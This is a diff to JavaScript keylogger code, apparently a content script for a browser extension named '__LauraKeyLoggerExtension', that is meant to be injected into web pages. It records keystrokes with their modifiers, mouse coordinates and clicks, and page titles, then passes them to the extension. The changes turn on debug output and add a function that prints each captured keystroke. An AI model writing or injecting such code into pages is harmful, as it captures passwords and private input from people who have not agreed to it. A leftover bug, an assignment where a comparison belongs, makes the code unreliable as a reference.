@@ -1,13 +1,13 @@
 /* !!! Notice : This code should be injected in a web page: modify it in such a way that no variable name
    may overlap right content name !!! */
 
-// Injected code __configurations
+// Injected code configurations
 
 var __config = {
 
 	// Defines the string that replaces the elements that do not
 	// belongs to the actual event
-	nullString: "NULL",
+	nullString: "null",
 
 	// MOUSE OPTIONS
 	// Defines the string that identifies a double click event
@@ -42,7 +42,7 @@ var __config = {
 	dispatchID: "__LauraKeyLoggerExtension",
 	
 	// Defines the debug routine
-	__debug__: false
+	__debug__: true
 }
 
 // ***** do not edit below this line ****** //
@@ -53,25 +53,51 @@ function __printDebug(message) {
 	if (__config.__debug__) { console.log(message); }
 }
 
+function __printKeylog() {
+	if (__config.__debug__) {
+		var obj = __keylogger.get();
+		var log = '\n';
+        
+        // Logging time
+        log += "Time: " + obj.time + '\n';
+        
+        // if defined, logging title
+        if (obj.title) { log += "Title: " + obj.title + '\n';}
+        if (obj.mouse) {
+            log += "Mouse:" + '\n';
+            log += '\t' + "X: " + obj.mouse.x + '\n';
+            log += '\t' + "Y:" + obj.mouse.y + '\n';
+            log += '\t' + "Event: " + obj.mouse.evnt + '\n';
+            log += '\t' + "Button: " + obj.mouse.button + '\n';
+        }
+        if (obj.keyboard) {
+            log += "Keyboard:" + obj.keyboard.string + '\n';
+        }
+        
+        __printDebug(log);
+	}
+}
+
 // Classes definitions
 
 // MOUSE CLASS
 // This class handles status and event for the mouse input
 function __Mouse() {
-	this.x    = 0;
-	this.y    = 0;
+	this.x      = 0;
+	this.y      = 0;
 	this.button = __config.nullString;
-	this.evnt = __config.nullString; 
+	this.evnt   = __config.nullString; 
 
 	// this function set the status of the mouse on each event
 	this.fire = function(e) {
 	// e -> event
-		if (e.type = "onmousemove") {
+		__printDebug(e);
+		if (e.type = "mousemove") {
 			this.x = e.screenX;
 			this.y = e.screenY;
 		}
 
-		if (e.type = "onclick" || "ondblclick" || "onmousedown") {
+		if (e.type === "click" || e.type === "dblclick") {
 			switch(e.button) {
 			case 0: 
 				this.button = __config.LeftMouseDef;
@@ -91,13 +117,13 @@ function __Mouse() {
 		}
 
 		switch(e.type) {
-			case "onclick": 
+			case "click": 
 				this.evnt = __config.clickDef;
 				break;
-			case "ondblclick":
+			case "dblclick":
 				this.evnt = __config.dblclickDef;
 				break;
-			case "onmousemove":
+			case "mousemove":
 				this.evnt = __config.mousemoveDef;
 				break;
 			case "onmousedown":
@@ -148,7 +174,7 @@ function __Keyboard() {
 			this.meta = e.metaKey ? true : false;
 			this.shift = e.shiftKey ? true : false;
 			this.keyCode = e.keyCode;
-			this.key = __config.OpeningDef + String.fromCharCode(this.keyCode) + __config.ClosingDef;
+			this.key = String.fromCharCode(this.keyCode);
 
 			// generation of the modifiers string
 			this.modifiers = "";
@@ -175,7 +201,7 @@ function __Keyboard() {
 	*/
 	this.get = function() {
 		return {
-			string:	'' + this.modifiers + this.key,
+			string:	'' + this.modifiers + __config.OpeningDef + this.key + __config.ClosingDef,
 			key: this.key,
 			modifiers: this.modifiers,
 			ctrl: this.ctrl,
@@ -194,13 +220,13 @@ function Keylogger() {
 	if(__config.opt_keyboard) { this.keyboard = new __Keyboard(); } else { this.keyboard = null; }
 	
 	this.title = null;
-	this.time = Date.now();
+	this.time = 0;
 	
 	// This function updates the status of the components, only if selected
 	// in the __config object
 	this.fire = function(e) {
 		__printDebug("Keylogger :: Fire Called!");
-		this.time = Date.now();
+		this.time = e.timeStamp;
 		if (__config.opt_mouse) { this.mouse.fire(e); }
 		if (__config.opt_keyboard) { this.keyboard.fire(e); }
 		if (__config.opt_title) { this.title = document.title; }
@@ -257,6 +283,7 @@ function eventHandler(e) {
 	
 	// Calling the event
 	document.dispatchEvent(myEvent);
+	__printKeylog();
 }
 
 document.onmousemove = function(e) { eventHandler(e); };
